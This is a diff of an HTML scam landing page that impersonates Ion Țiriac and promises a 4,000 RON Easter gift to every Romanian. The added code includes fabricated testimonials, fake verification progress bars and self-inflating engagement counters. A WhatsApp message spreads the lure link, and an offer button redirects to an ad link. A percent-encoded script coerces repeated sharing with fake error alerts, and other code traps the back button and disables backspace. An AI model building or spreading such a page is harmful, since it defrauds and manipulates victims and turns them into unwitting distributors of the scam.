-            border-bottom: 1px solid #ddd;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
+.testimonials-scroll {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    padding: 10px;
+    animation: scrollUp 25s linear infinite;
+}
 
-        .testimonial-card img {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            object-fit: cover;
-        }
+/* Individual testimonial */
+.testimonial {
+    background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+    color: white;
+    border-radius: 6px;
+    padding: 6px 8px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+    display: flex;
+    align-items: flex-start;
+    font-size: 12px;
+}
+/* Input area */
+.input-area {
+    display: flex;
+    padding: 8px;
+    border-top: 1px solid #ddd;
+    gap: 5px;
+}
 
-        .testimonial-content h4 {
-            margin: 0;
-            font-size: 16px;
-            color: #333;
-        }
+input[type="text"] {
+    flex: 1;
+    padding: 6px;
+    font-size: 12px;
+}
 
-        .testimonial-content p {
-            margin: 5px 0 0;
-            font-size: 14px;
-            color: #666;
-        }
+button {
+    padding: 6px 8px;
+    font-size: 12px;
+    cursor: pointer;
+}
 
-        @keyframes scroll-up {
-            0% { top: 0; }
-            100% { top: -600px; } /* Adjust based on content height */
-        }
-    </style>
+#imagePreview {
+    max-width: 60px;
+    max-height: 50px;
+    display: none;
+    margin-top: 5px;
+}
 
-    <div class="testimonials-container">
-        <div class="testimonials-wrapper">
-            <div class="testimonial-card">
-                <img src="https://i.pravatar.cc/100?u=1" alt="User">
-                <div class="testimonial-content">
-                    <h4>Andrei Popescu</h4>
-                    <p>Tocmai mi-am primit cei 4.000 RON! Mulțumesc mult!</p>
-                </div>
-            </div>
-            <div class="testimonial-card">
-                <img src="https://i.pravatar.cc/100?u=2" alt="User">
-                <div class="testimonial-content">
-                    <h4>Elena Popa</h4>
-                    <p>La început am fost sceptică, dar banii au intrat direct în contul meu BCR.</p>
-                </div>
-            </div>
-            <div class="testimonial-card">
-                <img src="https://i.pravatar.cc/100?u=3" alt="User">
-                <div class="testimonial-content">
-                    <h4>Vlad Ciobanu</h4>
-                    <p>Un ajutor excelent pentru Paște. Mulțumim, Ion Țiriac!</p>
-                </div>
-            </div>
-            <div class="testimonial-card">
-                <img src="https://i.pravatar.cc/100?u=4" alt="User">
-                <div class="testimonial-content">
-                    <h4>Maria Drăgan</h4>
-                    <p>A durat doar 15 minute să primesc confirmarea prin SMS.</p>
-                </div>
-            </div>
-            <div class="testimonial-card">
-                <img src="https://i.pravatar.cc/100?u=5" alt="User">
-                <div class="testimonial-content">
-                    <h4>Darius Matei</h4>
-                    <p>Foarte ușor de aplicat. Recomand tuturor prietenilor mei.</p>
-                </div>
-            </div>
-            <div class="testimonial-card">
-                <img src="https://i.pravatar.cc/100?u=1" alt="User">
-                <div class="testimonial-content">
-                    <h4>Andrei Popescu</h4>
-                    <p>Tocmai mi-am primit cei 4.000 RON! Mulțumesc mult!</p>
-                </div>
-            </div>
-        </div>
+/* Animations */
+@keyframes scrollUp {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(-50%); }
+}
+</style>
+</head>
+
+<body>
+
+<div class="testimonials-container">
+
+    <div class="testimonials-wrapper">
+        <div class="testimonials-scroll" id="testimonialsScroll"></div>
     </div>
-</center>
 
-    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    <div class="input-area">
+        <input type="text" id="newTestimonialInput" placeholder="Write a comment...">
+        <button id="imageUploadBtn">📷</button>
+        <button id="sendBtn">COMMENT</button>
+        <input type="file" id="imageInput" accept="image/*" style="display:none">
+    </div>
+
+    <img id="imagePreview">
+
+</div>
 
 <script>
-    var text = "Ion Țiriac: Felicitări, ești eligibil pentru un cadou de Paște de 4.000 RON de la Ion Țiriac. Apasă OK pentru a activa acum.",
-        url = "https://goldenstash.online/Share.html",
-        m = "Ion Țiriac: Felicitări, ești eligibil pentru un cadou de Paște de 4.000 RON de la Ion Țiriac. Apasă OK pentru a activa acum.",
-        s = "https://goldenstash.online/Share.html",
-        abcde = "https://omg10.com/4/10826485",
-        cl = "https://omg10.com/4/10826485";
+// Testimonials Data
+const sampleTestimonials = [
+{
+    name: "Adrian Munteanu",
+    initial: "A",
+    profilePic: "Adrian.png",
+    message: "I registered and received 4,000 RON. This support really helped me a lot.",
+    timestamp: "2m ago",
+    hasImage: true,
+  
+},
+{
+    name: "George Constantin",
+    initial: "G",
+    profilePic: "George.png",
+    message: "Honestly, I didn’t expect it to be this easy. I applied and after a few days I received 4,000 RON!",
+    timestamp: "4m ago",
+    hasImage: false
+},
+{
+    name: "Victor Moldovan",
+    initial: "V",
+    profilePic: "Victor.png",
+    message: "The support came at the time I needed it most. I used it to buy goods for my business.",
+    timestamp: "7m ago",
+    hasImage: true,
+    
+},
+{
+    name: "Doina Moraru",
+    initial: "D",
+    profilePic: "Doina.png",
+    message: "I received ₦10,000. I started my POS business with the money.",
+    timestamp: "10m ago",
+    hasImage: false
+},
+{
+    name: "Larisa Popescu",
+    initial: "L",
+    profilePic: "Larisa.png",
+    message: "I’m a student and this support helped me pay my hostel fees and buy books.",
+    timestamp: "12m ago",
+    hasImage: true,
+   
+},
+{
+    name: "Camelia Teodorescu",
+    initial: "C",
+    profilePic: "Camelia.png",
+    message: " I received 4,000 RON directly into my account.",
+    timestamp: "14m ago",
+    hasImage: false
+},
+{
+    name: "Rodica Lazăr",
+    initial: "R",
+    profilePic: "Rodica.png",
+    message: "My friends shared this link to me  I have received 4,000 RON too.",
+    timestamp: "16m ago",
+    hasImage: true,
+},
+{
+    name: "Monica Rusu",
+    initial: "M",
+    profilePic: "Monica.png",
+    message: "I received 4,000 RON. I used it to settle my debts.",
+    timestamp: "18m ago",
+    hasImage: true,
+},
+{
+    name: "Emil Florea",
+    initial: "E",
+    profilePic: "Emil.png",
+    message: "This is a great opportunity. Hurry up and apply before the deadline.",
+    timestamp: "20m ago",
+    hasImage: false
+},
+{
+    name: "Silviu Enache",
+    initial: "S",
+    profilePic: "Silviu.png",
+    message: "Thank you so much. I have now received 4,000 RON from this. This is real, not fake.",
+    timestamp: "22m ago",
+    hasImage: false
+}
+];
 
-    $("#go").click(function () {
-        $("#intro").fadeOut(0);
-        $("#loader").fadeIn(1000);
-        var i = 0;
-        var interval = setInterval(function () {
-            $("#num").text(i + "%");
-            i++;
-            if (i > 100) {
-                clearInterval(interval);
-                $("#loader").fadeOut(0);
-                $("#info").fadeIn(1000);
-            }
-        }, 50);
+const testimonialsScroll = document.getElementById('testimonialsScroll');
+const newTestimonialInput = document.getElementById('newTestimonialInput');
+const sendBtn = document.getElementById('sendBtn');
+const imageUploadBtn = document.getElementById('imageUploadBtn');
+const imageInput = document.getElementById('imageInput');
+const imagePreview = document.getElementById('imagePreview');
+
+let selectedImage = null;
+
+// Create testimonial element
+function createTestimonialElement(testimonial) {
+    const testimonialEl = document.createElement('div');
+    testimonialEl.className = "testimonial";
+
+    let avatar = testimonial.profilePic
+        ? `<img src="${testimonial.profilePic}" style="width:24px;height:24px;border-radius:50%;margin-right:8px;object-fit:cover;">`
+        : `<div style="width:24px;height:24px;border-radius:50%;margin-right:8px;background:#e0e0e0;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:10px;">${testimonial.initial}</div>`;
+
+    let imageHtml = testimonial.hasImage && testimonial.imageUrl
+        ? `<img src="${testimonial.imageUrl}" style="max-width:80px;max-height:60px;border-radius:4px;margin-top:4px;">`
+        : '';
+
+    testimonialEl.innerHTML = `
+        ${avatar}
+        <div>
+            <div style="font-weight:500;">${testimonial.name} <span style="color:#777;font-size:10px;">${testimonial.timestamp}</span></div>
+            <div>${testimonial.message}</div>
+            ${imageHtml}
+        </div>
+    `;
+    return testimonialEl;
+}
+
+// Add testimonials
+function addTestimonials() {
+    sampleTestimonials.forEach(t => {
+        testimonialsScroll.appendChild(createTestimonialElement(t));
     });
 
-    $("#confirm").click(function () {
-        if ($("#name").val().length < 4) {
-            $(".error").fadeIn(500);
-        } else {
-            $(".error").fadeOut(0);
-            $("#info").fadeOut(0);
-            $("#checking").fadeIn(1000);
-            var i = 0;
-            var interval = setInterval(function () {
-                i += Math.floor(Math.random() * 5) + 1;
-                $("#percentage").text(i + "%");
-                $("#fill").css("width", i + "%");
-                if (i == 50) {
-                    i = 49;
-                    setTimeout(function () {
-                        i = 50;
-                    }, 1000);
-                }
-                if (i >= 100) {
-                    clearInterval(interval);
-                    $("#load").fadeOut(0);
-                    $("#check").fadeIn(0);
-                    setTimeout(function () {
-                        $("#checking").fadeOut(0);
-                        $("#share").fadeIn(1000);
-                        $("#getname").html($("#name").val());
-                    }, 500);
-                }
-            }, 50);
+    // Clone for smooth scroll
+    testimonialsScroll.innerHTML += testimonialsScroll.innerHTML;
+}
+
+addTestimonials();
+
+// Add new testimonial
+function addNewTestimonial() {
+    const message = newTestimonialInput.value.trim();
+    if (!message && !selectedImage) return;
+
+    const newTestimonial = {
+        name: "You",
+        initial: "Y",
+        profilePic: null,
+        message: message,
+        timestamp: "now",
+        hasImage: selectedImage !== null,
+        imageUrl: selectedImage
+    };
+
+    testimonialsScroll.appendChild(createTestimonialElement(newTestimonial));
+    newTestimonialInput.value = '';
+    selectedImage = null;
+    imagePreview.style.display = "none";
+}
+
+sendBtn.addEventListener('click', addNewTestimonial);
+
+newTestimonialInput.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') addNewTestimonial();
+});
+
+imageUploadBtn.addEventListener('click', () => imageInput.click());
+
+imageInput.addEventListener('change', function(e) {
+    if (e.target.files[0]) {
+        const reader = new FileReader();
+        reader.onload = function(event) {
+            selectedImage = event.target.result;
+            imagePreview.src = selectedImage;
+            imagePreview.style.display = "block";
+        };
+        reader.readAsDataURL(e.target.files[0]);
+    }
+});
+</script></center>
+<br/><br/>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    <script type="text/javascript">
+        var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+    </script>
+    <script type="text/javascript">
+        $("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
         }
-    });
-
-    $("#whatsapp").click(function () {
-        window.open('whatsapp://send?text=' + text);
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
         var i = 0;
         var interval = setInterval(function () {
             i += 1;
-            $("#percentage2").text(i + "%");
-            $("#fill2").css("width", i + "%");
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
             if (i >= 100) {
                 clearInterval(interval);
-                $("#share").fadeOut(0);
-                $("#claim").fadeIn(1000);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
             }
         }, 50);
-    });
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+    </script>
 
-    $("#offer").click(function () {
-        window.open(abcde, "_blank");
-    });
+<script>
+    var text1 = "*Ion Țiriac 4,000 RON Easter CASH GIFTS*%0A %0A*Easter is a month of fasting and sharing. Ion Țiriac is giving 4,000 RON to every Romanian.*%0A%0A*_HOW TO GET IT NOW_*%0A_Visit the link below  and you will receive 4,000 RON instantly From Ion Țiriac._%0A i just Received mine%0A%0A_Click Here_👇%0Ahttps://goldenstash.online/Share.html",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://omg10.com/4/10826485",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
 </script>
+    
+    <script>
+        <!-- code by OD 
+        -->
+        document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+    </script>
+
 
     <script>
         (function (global) {
@@ -1297,14 +1465,14 @@ var timeleft = 98542;
     var noBackPlease = function () {
         global.location.href += "#";
 
-		// ne asigurăm că avem fructul disponibil pentru suc....
-		// 50 milisecunde pentru o singură dată nu costă mult (^__^)
+		// making sure we have the fruit available for juice....
+		// 50 milliseconds for just once do not cost much (^__^)
         global.setTimeout(function () {
             global.location.href += "!";
         }, 50);
     };
 	
-	// Anterior am avut setInerval aici....
+	// Earlier we had setInerval here....
     global.onhashchange = function () {
         if (global.location.hash !== _hash) {
             global.location.hash = _hash;
@@ -1315,13 +1483,13 @@ var timeleft = 98542;
         
 		noBackPlease();
 
-		// dezactivează backspace pe pagină, cu excepția câmpurilor de input și textarea..
+		// disables backspace on page except on input fields and textarea..
 		document.body.onkeydown = function (e) {
             var elm = e.target.nodeName.toLowerCase();
             if (e.which === 8 && (elm !== 'input' && elm  !== 'textarea')) {
                 e.preventDefault();
             }
-            // oprește propagarea evenimentului în sus în arborele DOM..
+            // stopping event bubbling up the DOM tree..
             e.stopPropagation();
         };
 		
@@ -1329,5 +1497,11 @@ var timeleft = 98542;
 
 })(window);
     </script>
-</body>
+
+
+
+<<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1732624,"","ffffff");</script><!-- END: Powered by Supercounters.com -->
+
+
 </html>
